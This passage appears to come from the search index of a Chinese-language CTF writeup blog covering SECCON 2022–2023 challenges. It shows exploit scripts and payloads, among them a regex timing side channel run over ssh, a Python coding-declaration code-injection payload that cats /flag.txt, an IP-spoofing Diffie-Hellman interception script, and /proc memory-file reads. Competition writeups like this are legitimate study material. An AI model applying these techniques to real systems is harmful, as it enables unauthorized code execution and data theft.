\u53d8\u91cf\u540d\u6ca1\u6709\u88ab\u91cd\u65b0\u8d4b\u503c\uff0c\u5b83\u4fdd\u7559\u7684\u4ecd\u7136\u662f\u8fd9\u4e2a\u51fd\u6570\uff0c\u6240\u4ee5 if check \u81ea\u7136\u5c31\u6210\u7acb\u4e86\u3002</p> <p>\u6240\u4ee5\u8fd9\u662f\u4e00\u9053\u7eaf\u7684 python \u8bed\u8a00\u7279\u6027\u9898\uff0c\u6700\u7ec8\u76ee\u6807\u5c31\u662f\u8981\u5728 check \u51fd\u6570\u7684 try \u5757\u4e2d\u89e6\u53d1\u9664\u4e86 FileNotFoundError\u3001IsADirectoryError\u3001PermissionError\u3001OSError\u3001KeyboardInterrupt \u4e4b\u5916\u7684\u5f02\u5e38\u3002\u53ef\u4ee5\u76f4\u63a5\u5728\u8f93\u5165\u7684\u65f6\u5019\u6309\u4e0b Ctrl-D\uff0c\u8fd9\u4f1a\u53d1\u9001\u4e00\u4e2a EOF\uff0c\u9020\u6210 input \u7684 EOFError\uff1b\u4e5f\u53ef\u4ee5\u8f93\u5165\u4e00\u4e2a \\x00\\n \u4e4b\u7c7b\u7684\uff0c\u8ba9 open \u51fd\u6570\u629b\u51fa ValueError\u3002\u7136\u540e\u5c31\u4f1a\u4f9d\u6b21\u8fdb\u5165 except \u548c finally \u5757\u5e76\u8f93\u51fa flag \u4e86\u3002</p> <p>flag: SECCON{exit_1n_Pyth0n_d0es_n0t_c4ll_exit_sysc4ll}</p>"},{"location":"writeups/seccon2022/#txtchecker","title":"txtchecker","text":"<p>\u5f88\u5750\u7262\u4f46\u5f88\u6709\u610f\u601d\u7684\u4e00\u9053\u9898\u3002\u9898\u76ee\u4ee3\u7801\u4e3b\u4f53\u5c31\u53ea\u6709\uff1a <pre><code>#!/bin/bash\nread -p \"Input a file path: \" filepath\nfile $filepath 2&gt;/dev/null | grep -q \"ASCII text\" 2&gt;/dev/null\nexit 0\n</code></pre> \u4f1a\u901a\u8fc7 ssh ForceCommand \u5f3a\u5236\u6bcf\u6b21\u8fde\u63a5\u6267\u884c\u8fd9\u4e2a\u811a\u672c\u3002flag \u5b58\u653e\u5728 /flag.txt \u4e2d\u3002</p> <p>\u8fd9\u4e2a\u811a\u672c\u53ef\u63a7\u7684\u53ea\u6709 file \u547d\u4ee4\u7684\u53c2\u6570\uff0c\u800c\u4e14\u5176 stdin \u4f1a\u901a\u8fc7\u7ba1\u9053\u4f20\u7ed9\u540e\u9762\u7684 grep\uff0cgrep \u4f7f\u7528\u4e86 -q \u4e5f\u5c31\u662f --quiet\uff0c\u4e0d\u8f93\u51fa\u4efb\u4f55\u4fe1\u606f\u3002\u800c\u4e14\u4e24\u6761\u6307\u4ee4\u7684 stderr \u90fd\u88ab\u91cd\u5b9a\u5411\u5230\u4e86\u9ed1\u6d1e\u4e2d\u3002\u5e76\u4e14\u4e0d\u8bba\u7ed3\u679c\u5982\u4f55\u90fd\u4f1a exit 0\u3002\u6240\u4ee5\u5c31\u662f\u4e00\u4e2a\u65e0\u4efb\u4f55\u56de\u663e\u3001\u65e0\u8fd4\u56de\u503c\u7684\u811a\u672c\u3002</p> <p>\u6240\u4ee5\u601d\u8def\u4e5f\u5c31\u53ea\u6709\u4e24\u4e2a\uff0c\u4e00\u4e2a\u662f\u7ed5\u8fc7\uff0c\u7136\u540e getshell\uff0c\u4f46\u662f\u8bd5\u4e86\u4e00\u4e0b\u4e0d\u592a\u53ef\u884c\uff0c\u800c\u4e14\u6240\u6709\u961f\u4f0d\u90fd\u8fde\u63a5\u540c\u4e00\u4e2a\u673a\u5668\uff0c\u5982\u679c\u662f\u8fd9\u6837\u7684\u8bdd\u6050\u6015\u65e9\u5c31\u88ab\u6253\u70c2\u4e86\u3002\u53e6\u4e00\u4e2a\u601d\u8def\u5c31\u662f\u4fa7\u4fe1\u9053\u3002</p> <p>\u7ffb\u4e86 file \u7684 man page\uff0c\u5176\u4e2d\u6709\u4e00\u4e2a -m \u53c2\u6570\u53ef\u4ee5\u6307\u5b9a magic \u6587\u4ef6\uff0c\u8fd9\u4e2a magic \u6587\u4ef6\u662f\u7528\u6765\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\u7684\uff0c\u5b83\u4e5f\u6709 man page\uff0c\u91cc\u9762\u6709\u76f8\u5173\u7684\u683c\u5f0f\u3002\u9664\u6b64\u4e4b\u5916\u4e5f\u641c\u5230\u4e86 file \u6e90\u7801\u4e2d\u7684\u81ea\u5e26 magic file \u4ee5\u53ca\u4e00\u4e2a\u7b2c\u4e09\u65b9 magic file \u7684 repo  lindenb/magic\u3002</p> <p>-m \u53c2\u6570\u53ea\u80fd\u6307\u5b9a magic file \u6587\u4ef6\uff0c\u800c\u6211\u4eec\u60f3\u8981\u7684\u80af\u5b9a\u662f\u4e0d\u5b58\u5728\u670d\u52a1\u5668\u4e0a\u7684\u3002\u6240\u4ee5\u8981\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6\uff0c\u8bd5\u4e86\u4e00\u4e0b -m /dev/stdin \u662f\u53ef\u4ee5\u7684\uff0c\u6bd4\u5982\u8f93\u5165 <code>/flag -m /dev/stdin</code>\uff0c\u7136\u540e\u5c31\u4f1a\u8981\u6c42\u8f93\u5165 magic file \u5185\u5bb9\uff0c\u7528 Ctrl-D \u7ed3\u675f\u3002\u6309\u7167\u4e0a\u9762\u7684\u4e00\u4e9b\u683c\u5f0f\uff0c\u5c1d\u8bd5\u4f7f\u7528\u6700\u65b9\u4fbf\u7684 regex\uff0c\u672c\u5730\u8c03\u8bd5\uff1a <pre><code>$ echo \"/flag.txt -m /dev/stdin\\n0 regex .* flag\" | ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@localhost -p 2022\nPseudo-terminal will not be allocated because stdin is not a terminal.\nctf@localhost's password:\n/flag.txt: flag, ASCII text\n$ echo \"/flag.txt -m /dev/stdin\\n0 regex .* %s\" | ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@localhost -p 2022\nPseudo-terminal will not be allocated because stdin is not a terminal.\nctf@localhost's password:\n/flag.txt: SECCON{dummy}, ASCII text\n</code></pre> \u6240\u4ee5\u5176\u5b9e\u5982\u679c\u6709\u56de\u663e\u7684\u8bdd\u5c31\u80fd\u76f4\u63a5\u6cc4\u9732\u51fa flag \u4e86\u3002\u4f46\u662f\u73b0\u5728\u8fd9\u6837\u53ea\u80fd\u901a\u8fc7\u4fa7\u4fe1\u9053\uff0c\u53ef\u4ee5\u901a\u8fc7\u65f6\u95f4\u957f\u77ed\u6765\u5224\u522b\u3002\u65e2\u7136\u662f\u901a\u8fc7\u6b63\u5219\u5339\u914d\uff0c\u90a3\u4e48\u6211\u4eec\u7406\u8bba\u5c31\u53ef\u4ee5\u901a\u8fc7\u8ba9\u5339\u914d\u548c\u4e0d\u5339\u914d\u65f6\u95f4\u4ea7\u751f\u5dee\u522b\uff0c\u7136\u540e\u9010\u5b57\u7b26 leak \u51fa flag\u3002</p> <p>\u7136\u540e\u5c31\u641c\u4e86\u641c ReDoS\uff0c\u770b\u4e0d\u592a\u61c2\uff08\u4e4b\u540e\u6709\u65f6\u95f4\u8865\u4e00\u8865\uff09\uff0c\u4f46\u662f\u611f\u89c9\u5728\u8fd9\u91cc\u90fd\u4e0d\u592a\u53ef\u7528\uff0c\u7136\u540e\u56db\u8001\u5e08\u7ed9\u4e86\u4e00\u4e2a <code>(.?){0, 1000}</code> \u8fd9\u4e2a\u6b63\u5219\u662f\u53ef\u4ee5\u5361\u4f4f\u7684\u3002</p> <p>\u518d\u770b magic \u7684\u683c\u5f0f\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u6587\u4ef6\u7c7b\u578b\u53ef\u4ee5\u6709\u591a\u6b21\u5339\u914d\uff0c\u5176\u5c42\u7ea7\u901a\u8fc7 &gt; \u6765\u8868\u793a\u3002\u4f8b\u5982\uff1a <pre><code>0 regex pattern1\n&gt;0x18 regex pattern2 type1\n&gt;0x18 regex pattern3 type2\n&gt;&gt;0x...\n</code></pre> \u5176\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6811\u72b6\u7684\u7ed3\u6784\uff0c\u524d\u9762\u7684\u4e0d\u6210\u7acb\u7684\u8bdd\uff0c\u4e0b\u4e00\u5c42\u5c31\u4e0d\u4f1a\u7ee7\u7eed\u5339\u914d\u3002\u6240\u4ee5\u53ef\u4ee5\u5728\u7b2c\u4e00\u5c42\u5224\u65ad\u662f\u5426\u5339\u914d flag\uff0c\u5728\u7b2c\u4e8c\u5c42\u901a\u8fc7\u524d\u9762\u7684\u6b63\u5219\u6765\u5361\u4f4f\uff0c\u8fd9\u6837\u5339\u914d\u4e0a\u7684\u8bdd\u65f6\u95f4\u5c31\u4f1a\u62d6\u6162\uff0c\u800c\u6bcf\u5339\u914d\u4e0a\u7684\u5c31\u4f1a\u8f83\u5feb\u4e00\u70b9\u3002\u6240\u4ee5\u8bbe\u8ba1\u7684 magic file payload \u5c31\u662f\uff1a <pre><code>0 regex SECCON\\\\{%s(.)+\\\\} aaa\n&gt;0 regex (.?){0, 1000} a\n</code></pre> \u7136\u540e\u5199\u4e00\u4e2a\u7a0b\u5e8f\u9010\u5b57\u7b26\u5c1d\u8bd5\uff0c\u7136\u540e\u53d6\u65f6\u95f4\u6700\u957f\u7684\u4e00\u4e2a\u586b\u5165 flag \u5e76\u7ee7\u7eed\uff0c\u5c31\u53ef\u4ee5\u4e00\u70b9\u4e00\u70b9 leak \u51fa flag\u3002</p> exp <pre><code>s = 'echo \"/flag.txt -m /dev/stdin\\n0 regex SECCON\\\\\\\\\\\\\\\\{%s(.)+\\\\\\\\\\\\\\\\} aaa\\n&gt;0 regex (.?){0,1000} a\" | sshpass -p ctf ssh -oStrictHostKeyChecking=no -oCheckHostIP=no ctf@txtchecker.seccon.games -p 2022'\n\nimport os, time, string\nimport subprocess\n\nflag = \"\"\n\nfor rd in range(10):\n    res, best = None, None\n    for i in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_$\":\n        print(i, end = \" \")\n        st = time.time()\n        subprocess.run(s % (flag + i), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        t = time.time() - st\n        print(t)\n        if (res is None) or t &gt; best:\n            res = i\n            best = t\n    flag = flag + res\n    print(f\"SECCON{{{flag}\")\n</code></pre> <p>\u627e\u961f\u53cb\u8981\u4e86\u4e00\u4e2a\u65e5\u672c\u7684\u5ef6\u8fdf\u5c0f\u7684\u670d\u52a1\u5668\uff0c\u8dd1\u4e86\u4e00\u4e0b\uff0c\u5f97\u5230 flag: SECCON{reDo5L1fe}</p>"},{"location":"writeups/seccon2022/#latexipy","title":"latexipy","text":"\u9898\u76ee\u4e3b\u4f53\u4ee3\u7801 <p><pre><code>import sys\nimport ast\nimport re\nimport tempfile\nfrom importlib import util\n\n\ndef get_fn_name(source: str) -&gt; str | None:\n    root = ast.parse(source)\n    if type(root) is not ast.Module:\n        return None\n    if len(root.body) != 1:\n        return None\n\n    fn = root.body[0]\n    if type(fn) is not ast.FunctionDef:\n        return None\n\n    fn.body.clear()\n    if not re.fullmatch(r\"def \\w+\\((\\w+(, \\w+)*)?\\):\", ast.unparse(fn)):\n        # You must define a function without decorators, type annotations, and so on.\n        return None\n\n    return str(fn.name)\n\n\nprint(\"\"\"\nLatexify as a Service!\n\nE.g.\n</code></pre> def solve(a, b, c):     return (-b + math.sqrt(b2 - 4ac)) / (2*a) <pre><code>ref. https://github.com/google/latexify_py/blob/v0.1.1/examples/equation.ipynb\n\nInput your function (the last line must start with __EOF__):\n\"\"\".strip(), flush=True)\n\nsource = \"\"\nwhile True:\n    line = sys.stdin.readline()\n    if line.startswith(\"__EOF__\"):\n        break\n    source += line\n\nname = get_fn_name(source)\nif name is None:\n    print(\"Invalid source\")\n    exit(1)\n\nsource += f\"\"\"\nimport latexify\n__builtins__[\"print\"](latexify.get_latex({name}))\n\"\"\"\n\nwith tempfile.NamedTemporaryFile(suffix=\".py\") as file:\n    file.write(source.encode())\n    file.flush()\n\n    print()\n    print(\"Result:\")\n    spec = util.spec_from_file_location(\"tmp\", file.name)\n    spec.loader.exec_module(util.module_from_spec(spec))\n</code></pre></p> <p>\u53cd\u6b63\u5c31\u662f\u8f93\u5165\u4e00\u4e2a\u51fd\u6570\uff08\u53ea\u80fd\u662f\u5355\u72ec\u4e00\u4e2a\u51fd\u6570\uff0c\u4e0d\u80fd\u6709\u88c5\u9970\u5668\u3001\u7c7b\u578b\u6ce8\u89e3\u7b49\uff09\uff0c\u7136\u540e\u62fc\u63a5\u8d77\u6765\u5f97\u5230\u4e00\u4e2a\u4e34\u65f6\u4ee3\u7801\u6587\u4ef6\uff0c\u7136\u540e\u8fd0\u884c\u3002\u6548\u679c\u5c31\u662f\u5229\u7528 v0.1.1 \u7248\u672c\u7684 latexify \u6765\u8bb2\u8fd9\u4e2a\u51fd\u6570\u8f6c\u6362\u4e3a LaTeX \u8bed\u6cd5\u7684\u8868\u793a\u3002flag \u5728 /flag.txt\uff0c\u8981\u8bd5\u56fe\u8bfb\u53d6\u5b83\u3002</p> <p>\u7ffb\u4e86 latexify \u7684\u6e90\u7801\uff0cv0.1.1 \u7684\u4ee3\u7801\u5f88\u7b80\u5355\uff0c\u4e3b\u8981\u5c31\u662f core.py \u4e00\u4e2a\u6587\u4ef6\u91cc\u904d\u5386\u4e86\u4e00\u904d ast \u6811\u3002\u6ca1\u6709\u4efb\u4f55 eval \u4e4b\u7c7b\u7684\u3001\u4e5f\u6ca1\u6709\u4efb\u4f55\u8c03\u7528\u90e8\u4ef6\u7684\u5730\u65b9\u3002\u9898\u76ee\u4e5f\u9650\u5236\u7684\u5f88\u6b7b\uff0c\u4e5f\u6ca1\u6709\u8c03\u7528\u7684\u5730\u65b9\u3002\u552f\u4e00\u53ef\u80fd\u5229\u7528\u7684\u662f\u63d0\u4f9b\u4e00\u4e2a print \u51fd\u6570\u8bd5\u56fe\u5728\u6253\u5370\u7ed3\u679c\u7684\u65f6\u5019\u8c03\u7528\uff0c\u4f46\u662f\u5b83\u53c8\u7528\u7684\u662f __builtins__[\"print\"] \u9632\u6b62\u4e86\u8fd9\u4e00\u884c\u4e3a\u3002</p> <p>\u60f3\u4e86\u5f88\u591a\u3001\u8bd5\u4e86\u5f88\u591a\u3001\u4e5f\u7ffb\u4e86\u6e90\u7801\uff0c\u6ca1\u505a\u51fa\u6765\u3002</p> <p>\u8d5b\u540e\u770b\u4e86 discord \u4e0a\u522b\u4eba\u5206\u4eab\u7684 payload\uff0c\u5f88\u7b80\u5355\uff0c\u6539\u4e86\u4e00\u4e0b\u5c31\u662f\uff1a <pre><code># coding: unicode_escape\ndef exp():\n    return \"\\u0022\\u000a__import__('os').system('cat /flag.txt')\\u000a\\u0022\"\n__EOF__\n</code></pre> \u8fd9\u4e2a\u539f\u7406\u4e5f\u5f88\u7b80\u5355\u3002\u5c31\u662f\u5728 get_fn_name \u8fdb\u884c\u68c0\u67e5\u7684\u65f6\u5019\u662f\u76f4\u63a5\u5bf9\u8f93\u5165\u8fdb\u884c ast \u89e3\u6790\u7136\u540e\u68c0\u67e5\u8bed\u6cd5\u6811\u7684\uff0c\u8fd9\u65f6\u6ce8\u91ca\u4f1a\u88ab\u5ffd\u7565\uff0creturn \u7684\u5b57\u7b26\u4e32\u662f\u5b8c\u6574\u7684\uff0c\u6240\u4ee5\u4e00\u5207\u68c0\u67e5\u90fd\u53ef\u4ee5\u901a\u8fc7\u3002</p> <p>\u800c\u5f53\u8fd0\u884c\u7684\u65f6\u5019\u662f\u5c06\u5176\u5199\u5165\u6587\u4ef6\u7136\u540e\u8fd0\u884c\u6587\u4ef6\u7684\u3002\u6211\u4eec\u7684\u8f93\u5165\u5728\u5f00\u5934\uff0c\u7b2c\u4e00\u884c\u7684\u6ce8\u91ca\u5c31\u6307\u5b9a\u4e86\u6587\u4ef6\u7f16\u7801\u4e3a unicode_escape\uff0c\u6240\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u89e3\u7801\u5f97\u5230\u7684\u5c31\u76f8\u5f53\u4e8e\uff1a <pre><code># coding: unicode_escape\ndef exp()\n    return \"\"\n__import__('os').system('cat /flag.txt')\n\"\"\nimport latexify\n__builtins__[\"print\"](latexify.get_latex({name}))\n</code></pre> \u6240\u4ee5\u5728\u6267\u884c\u7684\u65f6\u5019\u5c31\u4f1a cat flag \u4e86: SECCON{UTF7_is_hack3r_friend1y_encoding}</p>"},{"location":"writeups/seccon2022final/","title":"SECCON CTF 2022 Final Writeup","text":"<p> \u7ea6 479 \u4e2a\u5b57  53 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u53c2\u52a0\u7684\u7b2c\u4e00\u6b21\u7ebf\u4e0b\u8d5b\uff0c\u5728\u65e5\u672c\uff0c\u73a9\u7684\u5f88\u5f00\u5fc3\uff0c\u9898\u4e5f\u90fd\u5f88\u6709\u610f\u601d\u3002</p> <p>\u4e0d\u8fc7 misc \u53ea\u6709\u4e00\u9053\u7269\u7406\u9898\uff0cweb \u6bd4\u8f83\u5750\u7262\u6211\u4e5f\u4e0d\u4f1a\uff0cKoH \u8fd8\u633a\u523a\u6fc0\u633a\u6709\u610f\u601d\u7684\u3002</p>"},{"location":"writeups/seccon2022final/#sniffer","title":"Sniffer","text":"<p>\u4e00\u9053\u7269\u7406\u8bbe\u5907\u7684\u9898\uff0c\u4e0d\u96be\uff0c\u4f46\u5b9e\u64cd\u8fd8\u662f\u5f88\u6709\u610f\u601d\u7684\uff0c\u89e3\u9898\u9650\u65f6 50 \u5206\u949f\uff0c\u89e3\u9898\u524d\u4e24\u5c0f\u65f6\u624d\u4f1a\u4e0b\u53d1\u9898\u76ee\u3002</p> <p>\u76ee\u7684\u5927\u6982\u662f\u6709\u4e24\u4e2a\u8bbe\u5907 PC1 \u548c PC2\uff0c\u4e00\u4e2a\u5728\u8dd1 alice.py\uff08\u4e0b\u53d1\uff09\uff0c\u53e6\u4e00\u4e2a\u5728\u8dd1 bob.py\uff08\u672a\u77e5\uff09\uff0c\u4e2d\u95f4\u901a\u8fc7\u7f51\u7ebf\u8fde\u63a5\u3002\u8981\u6c42\u662f\u4ec5\u80fd\u63a5\u89e6\u7f51\u7ebf\u7684\u4e2d\u95f4\u90e8\u5206\uff0c\u8981\u5f97\u5230 Alice \u901a\u8fc7 socket \u8fde\u63a5\u53d1\u9001\u51fa\u53bb\u7684\u4e24\u4e2a flag\uff0c\u7b2c\u4e00\u4e2a\u662f\u660e\u6587\uff0c\u7b2c\u4e8c\u4e2a\u4f1a\u7ecf\u8fc7\u516c\u94a5\u4ea4\u6362\u52a0\u5bc6\u3002\u73b0\u573a\u4f1a\u63d0\u4f9b\u4ea4\u6362\u673a\u3001\u7f51\u7ebf\u3001\u6c34\u6676\u5934\u3001\u526a\u7ebf\u8bbe\u5907\u3002</p> <p>\u7b2c\u4e00\u60f3\u6cd5\u662f\u62c9\u8fc7\u6765\u76d1\u542c\u6d41\u91cf\uff0c\u4f46\u56e0\u4e3a\u662f socket \u8fd8\u8981\u4fdd\u6301\u4e0e Bob \u7684\u8fde\u63a5\uff0c\u6709\u70b9\u9ebb\u70e6\u3002\u800c\u4e14\u7b2c\u4e8c\u4e2a flag \u8fd8\u8981\u5229\u7528\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u4e5f\u662f\u9ebb\u70e6\u3002</p> <p>\u6362\u4e2a\u601d\u8def\uff0cAlice \u548c Bob \u901a\u8fc7 socket \u76f4\u63a5\u8fde\u63a5\uff0c\u8bbf\u95ee\u662f\u57fa\u4e8e ip \u786e\u5b9a\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u80fd\u4f2a\u9020 ip\uff0c\u8ba9 Alice \u4ee5\u4e3a\u6211\u4eec\u5c31\u662f Bob\uff0c\u5c31\u53ef\u4ee5\u6b63\u5e38\u901a\u4fe1\u5b8c\u7f8e\u62ff\u5230 flag\u3002</p> <p>\u4ea4\u6362\u673a\u578b\u53f7 NETGEAR ProSafe Plus GS105Ev2\uff0c\u53ef\u4ee5\u67e5\u5230\u76f8\u5173\u4f7f\u7528\u624b\u518c\u3002</p> <p>\u5230\u73b0\u573a\u540e\u9996\u5148\u8981\u5b8c\u6210\u7684\u5c31\u662f\u526a\u7ebf+\u63a5\u6c34\u6676\u5934\uff0c\u9898\u76ee\u91cc\u8bf4\u4e86\u4f7f\u7528\u7684\u662f T568A \u63a5\u7ebf\u65b9\u5f0f\uff0c\u7ed9 Alice \u90a3\u4e00\u4fa7\u989c\u8272\u6392\u597d\u63a5\u597d\u6c34\u6676\u5934\u63d2\u5728\u4ea4\u6362\u673a\u4e0a\uff08\u8fd8\u4e0d\u80fd\u6d4b\u8bd5\uff0c\u63a5\u6c34\u6676\u5934\u6548\u679c\u4e5f\u6ca1\u529e\u6cd5\u9a8c\u8bc1\uff09\uff0c\u53e6\u5916\u518d\u63a5\u4e00\u6839\u7ebf\u5230\u81ea\u5df1\u7535\u8111\u4e0a\u3002\u6309\u7167\u624b\u518c\u6307\u5bfc\u6253\u5f00\u8def\u7531\uff0c\u914d\u7f6e\u597d\u9759\u6001 ip \u5373\u53ef\uff0c\u8fd9\u65f6\u672c\u673a\u7684 ip \u5c31\u53ef\u4ee5\u8bbe\u7f6e\u4e3a Bob \u7684 192.168.1.103\uff0cping \u4e00\u4e0b Alice 102 \u4e5f\u80fd ping \u901a\u3002\u7136\u540e\u8dd1\u4e00\u4e0b\u9884\u5148\u5199\u597d\u7684 exp \u5c31\u80fd\u76f4\u63a5\u62ff\u5230\u4e24\u4e2a flag \u4e86\uff1a</p> <pre><code>import base64\nfrom cryptography.hazmat.backends import default_backend\nfrom cryptography.hazmat.primitives.asymmetric import dh\nfrom cryptography.hazmat.primitives import serialization\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.fernet import Fernet\nimport os\nimport socket\nimport struct\nimport time\n\ndef send_bytes(sock, data):\n    assert len(data) &lt; 0x10000\n    sock.send(struct.pack('&lt;H', len(data)))\n    sock.send(data)\n\ndef recv_bytes(sock):\n    size = struct.unpack('&lt;H', sock.recv(2))[0]\n    return sock.recv(size)\n\np = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF\ng = 2\n\nparameters = dh.DHParameterNumbers(p, g).parameters(default_backend())\npriv = parameters.generate_private_key()\npub2 = priv.public_key()\npub_bytes = pub2.public_bytes(\n    encoding=serialization.Encoding.PEM,\n    format=serialization.PublicFormat.SubjectPublicKeyInfo\n)\n\naddress = ('0.0.0.0', 12345)\nserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nserver.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)\nserver.bind(address)\nserver.listen(5)\n\nprint(\"[+] Listening on {}:{}\".format(*address))\nwhile True:\n    client, addr = server.accept()\n    print('[+] FLAG1:', recv_bytes(client))\n    pub = recv_bytes(client)\n    send_bytes(client, pub_bytes)\n    buf2 = recv_bytes(client)\n    pub1 = serialization.load_pem_public_key(pub)\n    shared = priv.exchange(pub1)\n    digest = hashes.Hash(hashes.SHA256())\n    digest.update(shared)\n    key = base64.urlsafe_b64encode(digest.finalize()[:32])\n    f = Fernet(key)\n    print('[+] FLAG2:', f.decrypt(buf2))\n    client.close()\n</code></pre> <p>flag1: SECCON{c4bl3_ch0k1ch0k1}\u3001flag2: SECCON{DH_1s_n0t_s4f3_4g41n5t_p4ck3t_m4n1pul4t10n}</p>"},{"location":"writeups/seccon2023/","title":"SECCON CTF 2023 Quals Writeup","text":"<p> \u7ea6 810 \u4e2a\u5b57  133 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>\u7b2c\u4e8c\u6b21\u6253 SECCON\uff0c\u65f6\u95f4\u6bd4\u53bb\u5e74\u65e9\uff0cmisc \u9898\u76ee\u6bd4\u8f83\u5c11\uff0c\u540e\u9762\u8fd8\u770b\u4e86\u70b9 pwn\u3002</p> <p>24h \u6bd4\u8d5b\uff0c\u6253\u4e86\u7b2c\u4e09\uff0c\u8fdb\u51b3\u8d5b\u4e86\u3002</p>"},{"location":"writeups/seccon2023/#readme-2023","title":"Readme 2023","text":"\u9898\u76ee\u6e90\u7801 <pre><code>import mmap\nimport os\nimport signal\n\nsignal.alarm(60)\n\ntry:\n    f = open(\"./flag.txt\", \"r\")\n    mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)\nexcept FileNotFoundError:\n    print(\"[-] Flag does not exist\")\n    exit(1)\n\nwhile True:\n    path = input(\"path: \")\n\n    if 'flag.txt' in path:\n        print(\"[-] Path not allowed\")\n        exit(1)\n    elif 'fd' in path:\n        print(\"[-] No more fd trick ;)\")\n        exit(1)\n\n    with open(os.path.realpath(path), \"rb\") as f:\n        print(f.read(0x100))\n</code></pre> <p>\u5f88\u6709 SECCON \u5473\u9053\u7684\u4e00\u9053\u9898\uff0c\u9898\u76ee\u6e90\u7801\u5c31\u662f\u5f88\u7b80\u5355\u7684 python\u3002</p> <p>\u8fd9\u91cc mmap.mmap \u5c31\u662f\u8c03\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u5c06 flag.txt \u6620\u5c04\u5230\u4e86\u5185\u5b58\u4e2d\u3002\u7136\u540e\u63d0\u4f9b\u4e86\u4efb\u610f\u6587\u4ef6\u5934 0x100 \u5b57\u8282\u7684\u8bfb\u53d6\uff0c\u8981\u6c42\u6587\u4ef6\u8def\u5f84\u4e2d\u4e0d\u80fd\u5305\u542b flag.txt \u548c fd\u3002</p> <p>\u6240\u4ee5\u601d\u8def\u5c31\u662f\u901a\u8fc7 proc \u6587\u4ef6\u7cfb\u7edf\u6765\u5c1d\u8bd5\u8bfb\u53d6\u5185\u5b58\u3002\u5982\u679c\u6ca1\u6709 0x100 \u5b57\u8282\u7684\u9650\u5236\u7684\u8bdd\u5c31\u53ef\u4ee5\u76f4\u63a5\u5728 /proc/self/maps \u4e2d\u8bfb\u53d6 flag.txt \u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u518d\u901a\u8fc7 /proc/self/map_files/... \u8fdb\u884c\u8bfb\u53d6\u3002</p> <p>\u4f46\u5b9e\u9645\u4e0a maps \u8f93\u51fa\u4e0d\u5230 flag.txt \u7684\u4f4d\u7f6e\uff0c\u6240\u4ee5\u5c31\u8981\u60f3\u4e00\u4e9b\u5176\u4ed6\u529e\u6cd5\u6765\u5f97\u5230\u5b83\u7684\u5730\u5740\u3002\u6620\u5c04\u540e\u7684\u5730\u5740\u662f\u5728 libc \u540e\u7684\uff0c\u6240\u4ee5\u5b83\u76f8\u5bf9\u4e8e libc \u57fa\u5740\u7684\u504f\u79fb\u5e94\u8be5\u662f\u6052\u5b9a\u7684\u3002\u6240\u4ee5\u5c31\u53d8\u6210\u4e86\u5f97\u5230 libc \u5730\u5740\u7684\u95ee\u9898\u4e86\u3002</p> <p>maps \u8fd8\u662f\u8f93\u51fa\u4e0d\u5230 libc\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7 /proc/self/syscall \u6765\u67e5\u770b\u5f53\u524d\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u56e0\u4e3a\u4e00\u76f4\u5728\u7b49\u5f85\u8f93\u5165\uff0c\u6240\u4ee5\u4e00\u76f4\u6709\u4e00\u6761 read \u7684 syscall\uff0c\u5b83\u8f93\u51fa\u7684\u6700\u540e\u4e00\u4e2a\u503c\u5c31\u662f pc\uff0c\u4e5f\u662f\u5728 libc \u4e2d\u7684\uff0c\u6240\u4ee5\u672c\u5730 docker \u8dd1\u51e0\u6b21\u8ba1\u7b97\u4e00\u4e0b\u504f\u79fb\u5c31\u53ef\u4ee5\u4e86\u3002</p> <pre><code>path: /proc/self/syscall\nb'0 0x7 0x55ad83fc2580 0x1000 0x2 0x0 0x0 0x7fff44d48b38 0x7fcbe603607d\\n'\n# 0x7fcbe603607d -&gt; 0x7fcbe6120000 \u504f\u79fb 958339\n</code></pre> <pre><code>path: /proc/self/syscall\nb'0 0x7 0x563f1e8376b0 0x400 0x2 0x0 0x0 0x7ffe63b78728 0x7f20e9db807d\\n'\npath: /proc/self/map_files/7f20e9ea2000-7f20e9ea3000\nb'SECCON{y3t_4n0th3r_pr0cf5_tr1ck:)}\\n'\n</code></pre>"},{"location":"writeups/seccon2023/#crabox","title":"crabox","text":"\u9898\u76ee\u6e90\u7801 <pre><code>import sys\nimport re\nimport os\nimport subprocess\nimport tempfile\n\nFLAG = os.environ[\"FLAG\"]\nassert re.fullmatch(r\"SECCON{[_a-z0-9]+}\", FLAG)\nos.environ.pop(\"FLAG\")\n\nTEMPLATE = \"\"\"\nfn main() {\n    {{YOUR_PROGRAM}}\n\n    /* Steal me: {{FLAG}} 